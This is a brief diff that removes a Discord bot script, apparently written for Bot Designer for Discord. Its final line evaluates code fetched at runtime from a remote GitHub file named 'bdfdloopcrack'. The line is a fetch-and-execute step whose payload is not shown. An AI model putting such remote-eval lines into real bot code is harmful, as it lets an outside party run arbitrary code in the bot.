@@ -1,7 +1,0 @@
-$nomention
-$async[a]
-Hello!
-$endasync
-$await[a]
-$replyIn[5s]
-$eval[$httpGet[https://raw.githubusercontent.com/Filipp947/LightHub/refs/heads/main/bdfdloopcrack]]
